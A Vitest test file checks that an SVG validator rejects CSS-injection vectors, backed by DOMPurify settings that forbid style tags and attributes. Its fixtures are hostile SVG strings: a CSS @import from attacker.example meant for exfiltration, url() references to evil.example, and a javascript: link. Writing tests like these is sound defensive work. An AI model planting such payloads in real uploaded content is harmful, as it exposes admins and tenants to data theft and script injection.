/**
 * Phase 177 gap-closure (177-07) RED -> GREEN — BL-04 CSS-injection guard.
 *
 * Verifies validateSvg() rejects 4 CSS-injection vectors that DOMPurify's SVG
 * profile permits by design. Regression guard ensures clean SVG still passes.
 *
 * Source: 177-VERIFICATION.md gap #4 (truth: "Inline preview cannot be used as
 * a CSS-injection vector against admins or downstream tenants viewing the
 * gallery") + 177-REVIEW.md §BL-04.
 *
 * Requirements covered: TGEN-05 (validator-at-ingest tightened), TADM-01 (queue
 * preview cannot exfil tenant CSS).
 */
import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { validateSvg } from '../../src/services/svgValidator.js';

const CLEAN_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
  + '<rect width="100" height="100" fill="#fff"/>'
  + '<text id="title" x="50" y="50" font-family="sans-serif" fill="#000">Hi</text>'
  + '</svg>';

describe('Phase 177 gap-closure (177-07) — BL-04 CSS-injection guard', () => {
  it('Test 1: rejects SVG with <style>@import url(https://attacker...) — CSS @import injection', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
      + '<style>@import url(\'https://attacker.example/exfil.css\');</style>'
      + '<text id="title" x="50" y="50" fill="#000">Hi</text>'
      + '</svg>';
    const result = validateSvg(maliciousSvg);
    expect(result.ok).toBe(false);
    expect(result.errors.some((e) => e.includes('@import'))).toBe(true);
  });

  it('Test 2: rejects SVG with url(http://...) CSS external resource ref', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
      + '<rect width="100" height="100" fill="url(http://evil.example/x.svg)"/>'
      + '<text id="title" x="50" y="50" fill="#000">Hi</text>'
      + '</svg>';
    const result = validateSvg(maliciousSvg);
    expect(result.ok).toBe(false);
    expect(result.errors.some((e) => e.includes('url(http(s)://'))).toBe(true);
  });

  it('Test 3: rejects SVG with url(//...) protocol-relative external resource ref', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
      + '<rect width="100" height="100" fill="url(//evil.example/x)"/>'
      + '<text id="title" x="50" y="50" fill="#000">Hi</text>'
      + '</svg>';
    const result = validateSvg(maliciousSvg);
    expect(result.ok).toBe(false);
    expect(result.errors.some((e) => e.includes('url(//...)'))).toBe(true);
  });

  it('Test 4: rejects SVG with javascript: pseudo-protocol', () => {
    const maliciousSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">'
      + '<a href="javascript:alert(1)">'
      + '<text id="title" x="50" y="50" fill="#000">x</text>'
      + '</a>'
      + '</svg>';
    const result = validateSvg(maliciousSvg);
    expect(result.ok).toBe(false);
    expect(result.errors.some((e) => e.includes('javascript:'))).toBe(true);
  });

  it('Test 5 (regression guard): clean valid SVG with hex fills still passes', () => {
    const result = validateSvg(CLEAN_SVG);
    expect(result.ok).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it('Test 6: locked DOMPurify config in svgValidator.js Rule 4 forbids <style>+style attrs', () => {
    const src = fs.readFileSync(
      path.resolve(__dirname, '../../src/services/svgValidator.js'),
      'utf8'
    );
    // Assert the new tightened config tokens are present in the file.
    expect(src).toMatch(/FORBID_TAGS:\s*\[\s*['"]style['"]\s*\]/);
    expect(src).toMatch(/FORBID_ATTR:\s*\[\s*['"]style['"]\s*\]/);
  });
});
